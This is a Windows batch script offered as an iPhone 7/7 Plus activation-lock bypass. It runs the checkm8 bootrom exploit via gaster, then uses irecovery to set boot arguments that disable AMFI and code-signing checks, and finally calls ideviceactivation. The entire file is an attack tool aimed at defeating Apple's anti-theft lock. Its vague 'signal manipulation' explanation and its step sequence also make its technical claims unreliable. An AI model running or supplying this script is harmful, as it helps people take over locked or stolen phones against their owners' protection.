@echo off
REM A10 Hello Bypass with Signals - Uses checkm8 exploit for iPhone 7/7+
REM This bypass uses signal manipulation for activation lock bypass

echo [*] A10 Hello Bypass with Signals
echo [*] Supported devices: iPhone 7, iPhone 7 Plus (A10 Fusion)
echo.

echo [*] Step 1: Putting device in pwned DFU mode using checkm8...
gaster\gaster.exe pwn
if errorlevel 1 (
    echo [!] Failed to put device in pwned DFU mode
    echo [!] Make sure device is in DFU mode and connected via USB
    exit /b 1
)
echo [*] Device is now in pwned DFU mode

echo.
echo [*] Step 2: Setting up signal environment...
libimobiledevice\irecovery.exe -c "setenv auto-boot true"
if errorlevel 1 (
    echo [!] Failed to set auto-boot environment
    exit /b 1
)

echo [*] Step 3: Saving environment...
libimobiledevice\irecovery.exe -c "saveenv"
if errorlevel 1 (
    echo [!] Failed to save environment
    exit /b 1
)

echo [*] Step 4: Setting boot arguments for signal bypass...
libimobiledevice\irecovery.exe -c "setenv boot-args rd=md0 amfi=0xff cs_enforcement_disable=1 -v"
if errorlevel 1 (
    echo [!] Failed to set boot arguments
    exit /b 1
)

echo [*] Step 5: Saving boot configuration...
libimobiledevice\irecovery.exe -c "saveenv"
if errorlevel 1 (
    echo [!] Failed to save boot configuration
    exit /b 1
)

echo.
echo [*] Step 6: Attempting signal-based activation bypass...
libimobiledevice\ideviceactivation.exe activate -s
REM Note: ideviceactivation may return non-zero even on partial success
echo [*] Activation attempt completed

echo.
echo [*] Step 7: Rebooting device...
libimobiledevice\irecovery.exe -c "reboot"
echo [*] Reboot command sent

echo.
echo [*] A10 Hello Bypass process completed!
echo [*] The device should reboot and bypass the Hello/Activation screen.
echo [*] If the bypass did not work, try the following:
echo     1. Put device back in DFU mode
echo     2. Run this exploit again
echo     3. Make sure you have cellular signal or WiFi connection
echo.
